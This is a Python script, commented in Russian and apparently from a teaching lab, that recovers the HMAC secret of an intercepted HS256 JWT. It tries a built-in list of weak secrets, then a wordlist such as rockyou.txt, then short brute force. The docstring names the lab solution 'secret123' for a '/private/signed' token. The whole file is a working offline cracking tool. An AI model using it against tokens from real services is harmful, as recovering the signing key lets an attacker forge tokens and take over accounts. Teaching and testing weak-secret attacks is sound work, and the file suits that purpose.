"""Подбор секрета HS256 из перехваченного JWT-токена.

HS256 подписывает заголовок и payload через HMAC-SHA256 общим секретом.
Если секрет слабый (словарное слово, значение по умолчанию, короткая строка),
его можно восстановить офлайн, перебирая кандидатов и сравнивая подпись.

Именно так студенты восстанавливают `secret123` из токена `/private/signed`,
ни разу не заглядывая в исходники клиента.

Запуск:
    # Перебрать встроенный список частых/слабых секретов
    python scripts/crack_hs256.py "<jwt>"

    # Также попробовать wordlist-файл (по одному кандидату в строке)
    python scripts/crack_hs256.py "<jwt>" --wordlist rockyou.txt

    # Брутфорс коротких буквенно-цифровых секретов (медленно, maxlen небольшой)
    python scripts/crack_hs256.py "<jwt>" --brute --maxlen 6

Код возврата 0, если секрет найден, иначе 1.
"""

import argparse
import base64
import hashlib
import hmac
import itertools
import json
import string
import sys
from typing import Iterable

# Небольшой стартовый список. Для сложных целей дополните настоящим словарём.
COMMON_SECRETS = [
    "secret",
    "secret123",
    "secretkey",
    "password",
    "password123",
    "123456",
    "1234567890",
    "admin",
    "admin123",
    "qwerty",
    "letmein",
    "changeme",
    "test",
    "dev",
    "jwt",
    "jwtsecret",
    "mysecret",
    "supersecret",
    "topsecret",
    "s3cr3t",
    "key",
    "private",
    "token",
    "signature",
    "hs256",
]


def b64url_decode(data: str) -> bytes:
    padding = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)


def b64url_encode(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def parse_token(token: str) -> tuple[bytes, bytes, dict]:
    """Разбивает JWS-токен на (signing_input, signature, header_dict)."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError(
            f"Ожидается JWS-токен из 3 сегментов, получено {len(parts)}. "
            "Это работает только для подписанных токенов, не для JWE."
        )
    signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
    signature = b64url_decode(parts[2])
    header = json.loads(b64url_decode(parts[0]))
    return signing_input, signature, header


def iter_bruteforce(maxlen: int, alphabet: str) -> Iterable[str]:
    """Генерирует всех кандидатов длиной от 1 до maxlen."""
    for length in range(1, maxlen + 1):
        for combo in itertools.product(alphabet, repeat=length):
            yield "".join(combo)


def load_wordlist(path: str) -> Iterable[str]:
    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
        for line in handle:
            candidate = line.strip()
            if candidate:
                yield candidate


def crack(
    token: str,
    candidates: Iterable[str],
    quiet: bool = False,
) -> str | None:
    """Возвращает первого кандидата, чей HMAC совпал с подписью токена."""
    signing_input, signature, header = parse_token(token)

    if header.get("alg") != "HS256":
        raise ValueError(
            f"Алгоритм токена — {header.get('alg')!r}, а не HS256. "
            "Этот метод нацелен только на токены с HMAC-подписью."
        )

    tried = 0
    for candidate in candidates:
        tried += 1
        digest = hmac.new(
            candidate.encode("utf-8"), signing_input, hashlib.sha256
        ).digest()
        if hmac.compare_digest(digest, signature):
            print(f"[+] Секрет найден: {candidate!r} (проверено кандидатов: {tried})")
            return candidate

    if not quiet:
        print(f"[-] Секрет не найден среди {tried} кандидатов.")
    return None


def main() -> int:
    parser = argparse.ArgumentParser(description="Подбор секрета HS256 для JWT")
    parser.add_argument("token", help="Перехваченный JWS-токен (3 сегмента)")
    parser.add_argument("--wordlist", help="Путь к файлу словаря")
    parser.add_argument(
        "--brute",
        action="store_true",
        help="Брутфорс коротких буквенно-цифровых секретов (медленно)",
    )
    parser.add_argument("--maxlen", type=int, default=5, help="Максимальная длина для брутфорса")
    parser.add_argument(
        "--alphabet",
        default=string.ascii_lowercase + string.digits,
        help="Символы для брутфорса",
    )
    args = parser.parse_args()

    try:
        # 1) встроенный список частых секретов
        if crack(args.token, COMMON_SECRETS) is not None:
            return 0

        # 2) пользовательский словарь
        if args.wordlist:
            if crack(args.token, load_wordlist(args.wordlist)) is not None:
                return 0

        # 3) брутфорс коротких секретов
        if args.brute:
            print(f"[*] Брутфорс до длины {args.maxlen}...")
            if crack(args.token, iter_bruteforce(args.maxlen, args.alphabet)) is not None:
                return 0
    except (ValueError, OSError) as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1

    return 1


if __name__ == "__main__":
    raise SystemExit(main())
